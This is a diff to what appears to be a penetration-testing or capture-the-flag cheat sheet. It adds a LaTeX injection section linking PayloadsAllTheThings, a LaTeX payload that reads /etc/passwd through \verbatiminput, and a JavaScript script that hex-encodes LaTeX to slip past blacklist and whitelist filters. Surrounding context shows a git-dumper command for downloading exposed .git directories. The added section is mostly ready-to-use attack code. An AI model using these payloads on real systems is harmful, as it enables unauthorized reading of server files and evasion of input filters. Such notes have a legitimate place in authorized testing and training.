@@ -11,6 +11,28 @@ pip install git-dumper
 git-dumper https://<host>/.git ./out
 ```
 
+## LaTeX
+- [Payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LaTeX%20Injection/README.md)
+
+Basic file read
+```latex
+\documentclass[12pt]{article}
+\usepackage{verbatim}
+\begin{document}
+\verbatiminput{/etc/passwd}
+\end{document}
+```
+
+### Bypass blacklist/whitelist
+Js script to obfuscate LaTeX as hex values
+```js
+const fs = require('fs')
+const args = process.argv.slice(2);
+const scriptContent = fs.readFileSync(args[0]).toString()
+const parsed = scriptContent.split('\n').map(line => line.split('').map(char =>  "^^" + Number(char.charCodeAt(0)).toString(16)).join('')).join("\n")
+fs.writeFileSync(args[1], parsed)
+```
+
 ## Dotnet
 
 ```bash
